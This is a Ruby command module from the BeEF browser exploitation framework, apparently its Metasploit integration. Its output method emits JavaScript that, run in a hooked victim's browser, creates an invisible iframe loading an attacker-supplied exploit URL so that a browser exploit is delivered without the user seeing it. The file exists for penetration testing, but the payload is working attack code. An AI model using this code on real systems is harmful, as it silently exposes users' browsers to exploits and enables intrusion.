#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#

# This is a dummy module to fool BeEF's loading system
class Msf_module < BeEF::Core::Command
        def output

	command = BeEF::Core::Models::Command.first(:id => @command_id)
	data = JSON.parse(command['data'])
	sploit_url =  data[0]['sploit_url']

      return "  
beef.execute(function() {
        var result; 

        try { 
                var sploit = beef.dom.createInvisibleIframe();
                sploit.src = '#{sploit_url}';
        } catch(e) { 
                for(var n in e) 
                        result+= n + ' '  + e[n] ; 
        } 

});"
        end

end
